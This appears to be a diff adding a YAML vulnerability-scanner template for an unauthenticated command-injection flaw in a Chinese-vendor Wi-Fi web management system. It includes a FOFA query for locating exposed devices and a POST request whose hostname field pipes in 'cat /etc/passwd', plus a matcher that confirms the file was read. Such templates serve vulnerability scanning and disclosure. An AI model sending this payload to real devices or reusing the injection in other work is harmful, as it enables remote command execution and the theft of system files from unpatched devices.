@@ -1,0 +1,17 @@
+id: poc-yaml-cdatatec-jumpto-rce
+info:
+  name: 西迪特 Wi-Fi Web管理系统 jumpto.php未授权RCE漏洞
+  severity: critical
+  tags:
+  - 命令注入
+  finger: Wi-Fi Web管理系统
+  fofa: title=="Wi-Fi Web管理"
+requests:
+- method: POST
+  path: /cgi-bin/jumpto.php?class=diagnosis&page=config_save&isphp=1
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: call_function=ping&iface=eth0&hostname=127.0.0.1|cat%20/etc/passwd
+  expression: "status_code == 200 && \nmatches(body, \"root:.*:0:0:\")\n"
+variables: {}
+transport: http
